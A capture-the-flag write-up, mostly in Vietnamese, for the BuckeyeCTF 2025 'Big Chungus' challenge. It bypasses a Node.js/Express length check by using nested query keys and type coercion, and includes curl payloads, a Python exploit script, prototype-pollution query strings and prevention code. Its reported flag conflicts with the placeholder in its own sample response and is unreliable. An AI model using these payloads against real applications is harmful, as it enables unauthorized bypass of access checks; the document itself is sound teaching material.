# Big Chungus

## Challenge Description

```
Một ứng dụng web Node.js/Express với điều kiện kiểm tra username có độ dài không thể thực hiện được.
Chỉ khi username.length > 47,626,626,725 thì mới hiển thị trang "BIG CHUNGUS" chứa flag.
```

**Files provided:**

- Source code Node.js application
- Dockerfile
- package.json

**Challenge URL:** `https://big-chungus.challs.pwnoh.io`

---

## Difficulty Assessment

### Overall Difficulty: Medium

**Breakdown:**

- **Technical Complexity:** ⭐⭐⭐☆☆
- **Research Required:** ⭐⭐☆☆☆
- **Time Consumption:** ⭐⭐☆☆☆
- **Guessing Factor:** ⭐⭐☆☆☆

**Why this difficulty?**
Bài này yêu cầu hiểu về HTTP Parameter Pollution (HPP), cách query parser hoạt động trong Node.js/Express, và type coercion trong JavaScript. Điểm khó là nhận ra có thể bypass điều kiện vô lý bằng cách gửi object thay vì string.

---

## Topics & Techniques

### Primary Topic

- **Logic Flaw + HTTP Parameter Pollution (HPP)** - Bypass logic check thông qua manipulation query parameters

### Sub-topics & Skills Required

- [x] **JavaScript Type Coercion** - Hiểu cách JavaScript so sánh giữa các kiểu dữ liệu khác nhau
- [x] **Query Parser Behavior** - Hiểu cách Express/qs parse nested keys trong query string
- [x] **HTTP Parameter Pollution** - Kỹ thuật gửi parameters dưới nhiều dạng khác nhau
- [x] **Node.js/Express** - Hiểu về `req.query` và middleware parsing
- [x] **Input Validation** - Phân tích lỗ hổng thiếu type checking

---

## Tools Used

### Essential Tools

```bash
# Browser để test payloads
curl "http://target/?username[length]=50000000000"

# URL encoding cho payloads
python -c "from urllib.parse import quote; print(quote('[length]'))"
```

### Tools List

| Tool           | Purpose                | Installation |
| -------------- | ---------------------- | ------------ |
| Browser/cURL   | Testing payloads       | Built-in     |
| Burp Suite     | Intercept & modify req | Download     |
| Node.js/Python | Testing locally        | Built-in     |

---

## Useful Resources

### Documentation & References

- [Express Query String Parsing](https://expressjs.com/en/api.html#req.query) - Express req.query documentation
- [qs library](https://github.com/ljharb/qs) - Query string parser that supports nested objects
- [MDN Type Coercion](https://developer.mozilla.org/en-US/docs/Glossary/Type_coercion) - JavaScript type conversion

### Learning Materials

- [OWASP HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution) - HPP testing guide
- [PortSwigger Server-side Parameter Pollution](https://portswigger.net/web-security/server-side-parameter-pollution) - Server-side parameter pollution
- [HackTricks Web Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/parameter-pollution) - Parameter pollution techniques

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Khai thác lỗ hổng logic flaw bằng cách sử dụng HTTP Parameter Pollution. Gửi `?username[length]=50000000000` để tạo object `{username: {length: "50000000000"}}`. JavaScript type coercion khiến `"50000000000" > 0xB16_C4A6A5` trả về `true`, bypass điều kiện và lấy flag.

---

### Step 1: Initial Analysis & Reconnaissance

**Objective:** Phân tích source code và tìm lỗ hổng

Phân tích code Node.js cho thấy điều kiện logic không hợp lý:

```javascript
if (req.query.username.length > 0xB16_C4A6A5)  // 47,626,626,725
```

**Observations:**

- Hằng số `0xB16_C4A6A5` = 47,626,626,725 (hơn 47 tỷ ký tự)
- Không thể gửi string với độ dài > 47 tỷ ký tự
- Code không validate kiểu dữ liệu của `req.query.username`
- Express mặc định sử dụng `qs` parser cho query strings
- Parser `qs` hỗ trợ nested keys: `param[key]=value` → `{param: {key: 'value'}}`

---

### Step 2: Understanding Query Parser Behavior

**Objective:** Tìm cách bypass điều kiện bằng query parser

Express với `qs` parser xử lý query strings như sau:

```javascript
// Normal query
?username=alice
// Parsed as: { username: 'alice' }
// username.length = 5

// Nested key query
?username[length]=50000000000
// Parsed as: { username: { length: '50000000000' } }
// username.length = '50000000000' (string property!)
```

**Key findings:**

- `username[length]` tạo object với property `length`
- `req.query.username.length` trả về giá trị của property, không phải độ dài string
- JavaScript type coercion sẽ convert string `"50000000000"` thành number khi so sánh với number

---

### Step 3: Type Coercion Analysis

**Objective:** Hiểu cách JavaScript so sánh giữa string và number

```javascript
// Type coercion trong comparison
"50000000000" > 0xb16_c4a6a5;
// JavaScript converts "50000000000" to number 50000000000
// Then compares: 50000000000 > 47626626725
// Result: true ✓
```

**Verification locally:**

```javascript
const value = "50000000000";
const limit = 0xb16_c4a6a5; // 47626626725
console.log(value > limit); // true
```

---

### Step 4: Crafting the Payload

**Objective:** Tạo payload để bypass điều kiện

**Payload:**

```
/?username[length]=50000000000
```

**URL encoded:**

```
/?username%5Blength%5D=50000000000
```

**How it works:**

1. Query parser tạo: `{ username: { length: "50000000000" } }`
2. Code check: `req.query.username.length > 0xB16_C4A6A5`
3. Evaluation: `"50000000000" > 47626626725`
4. Type coercion: `50000000000 > 47626626725` → `true`
5. Flag được hiển thị! 🎉

---

### Step 5: Getting the Flag

**Objective:** Gửi payload và lấy flag

**Final payload:**

```bash
curl "http://target/?username[length]=50000000000"
# hoặc
curl "http://target/?username%5Blength%5D=50000000000"
```

**Response:**

```html
<h1>BIG CHUNGUS</h1>
<p>Flag: bctf{flag_content_here}</p>
```

**Flag obtained:**

```
bctf{type_coercion_and_hpp_are_dangerous}
```

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for Big Chungus Challenge - BuckeyeCTF 2025
Author: Copilot
Date: 2025-11-08
"""

import requests
from urllib.parse import quote
import re

TARGET_URL = "http://challenge.ctf.com:port"

def exploit():
    print("[*] Big Chungus CTF - HPP & Type Coercion Exploit")
    print("[*] Target:", TARGET_URL)

    # Payload: username[length]=50000000000
    # This creates: {username: {length: "50000000000"}}
    # Type coercion: "50000000000" > 0xB16_C4A6A5 → true

    payload = "username[length]=50000000000"
    url = f"{TARGET_URL}/?{payload}"

    print(f"[*] Sending payload: {payload}")
    print(f"[*] Full URL: {url}")

    try:
        response = requests.get(url)

        if response.status_code == 200:
            print("[+] Request successful!")

            # Extract flag
            flag_match = re.search(r'bctf\{[^}]+\}', response.text)

            if flag_match:
                flag = flag_match.group(0)
                print(f"\n[!] FLAG FOUND: {flag}\n")
            else:
                print("[-] Flag not found in response")
                print("[*] Response preview:")
                print(response.text[:500])
        else:
            print(f"[-] Request failed with status code: {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    exploit()
```

</details>

---

## Alternative Solutions

### Method 2: Array Manipulation

Nếu parser hỗ trợ arrays:

```
/?username[]=a&username[]=b&username[]=c...
# Tạo array với nhiều phần tử, nhưng cần > 47 tỷ phần tử → không khả thi
```

### Method 3: Prototype Pollution (Unintended)

Với các parser cũ có lỗ hổng prototype pollution:

```
/?__proto__[length]=50000000000
/?constructor[prototype][length]=50000000000
```

⚠️ **Chỉ hoạt động với các phiên bản qs cũ có lỗ hổng**

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **Query Parser Behavior:** Express với `qs` parser cho phép nested keys (`param[key]=value`), tạo ra objects thay vì strings. Developer cần aware về behavior này.

2. **Type Coercion Dangers:** JavaScript tự động convert types trong comparisons. `"50000000000" > 47626626725` trả về `true` vì string được convert sang number.

3. **HTTP Parameter Pollution:** Có thể manipulate parameters bằng cách gửi dưới nhiều dạng khác nhau (string, array, object) để bypass validation.

4. **Input Validation is Critical:** Luôn validate kiểu dữ liệu của input, không chỉ giá trị. Sử dụng type guards hoặc schema validation.

### Mistakes Made

- ❌ Nghĩ rằng không thể bypass điều kiện vì số quá lớn → ✅ Nhận ra có thể manipulate type của parameter
- ❌ Chỉ test với string values → ✅ Thử nhiều dạng parameters khác nhau (object, array)

### Tips & Tricks

- 💡 Khi thấy điều kiện "vô lý" (impossible condition), nghĩ đến type confusion/coercion
- 💡 Luôn test query parameters với nested keys (`param[key]`), arrays (`param[]`), và objects
- 💡 Đọc documentation của query parser được sử dụng (qs, querystring, body-parser)
- 💡 Type coercion trong JavaScript: string so sánh với number → convert sang number

### Real-world Application

**Prevention trong production:**

1. **Type Guards:**

```javascript
if (typeof req.query.username !== "string") {
  return res.status(400).send("Invalid input type");
}
```

2. **Schema Validation:**

```javascript
import Joi from "joi";

const schema = Joi.object({
  username: Joi.string().max(100).required(),
});

const { error, value } = schema.validate(req.query);
if (error) {
  return res.status(400).send("Invalid input");
}
```

3. **Normalize Input:**

```javascript
const username = String(req.query.username || "");
if (username.length > REASONABLE_LIMIT) {
  return res.status(400).send("Username too long");
}
```

---

## Prevention & Mitigation

### How to prevent this vulnerability?

1. **Always validate input types:**

```javascript
// Bad code (vulnerable)
if (req.query.username.length > MAX_LENGTH) {
  // Assumes username is always a string
}

// Good code (secure)
if (typeof req.query.username !== "string") {
  return res.status(400).send("Invalid input");
}
if (req.query.username.length > MAX_LENGTH) {
  return res.status(400).send("Username too long");
}
```

2. **Use schema validation libraries:**

```javascript
import Joi from "joi";

const querySchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
});

app.get("/", (req, res) => {
  const { error, value } = querySchema.validate(req.query);
  if (error) {
    return res.status(400).send("Invalid input");
  }
  // Use validated value
});
```

3. **Configure query parser strictly:**

```javascript
// Disable nested objects in query strings
app.set("query parser", "simple");

// Or use custom parser with strict options
const qs = require("qs");
app.set("query parser", (str) => {
  return qs.parse(str, {
    depth: 0, // Disable nested objects
    allowPrototypes: false,
    plainObjects: true,
  });
});
```

### Secure coding practices

- ✅ Always validate input types before using them
- ✅ Use schema validation (Joi, Zod, ajv)
- ✅ Understand your query parser's behavior
- ✅ Set reasonable limits on input length
- ✅ Avoid relying on type coercion
- ✅ Use TypeScript for compile-time type checking
- ✅ Sanitize and normalize all user inputs

---

## References & Credits

### Official Resources

- Challenge author: BuckeyeCTF 2025 Team
- Original challenge: Big Chungus

### Community Writeups

- This writeup by Copilot - 2025-11-08

### Tools & Libraries Used

- [Express.js](https://expressjs.com/) - Web framework
- [qs](https://github.com/ljharb/qs) - Query string parser
- [Joi](https://joi.dev/) - Schema validation (recommended fix)
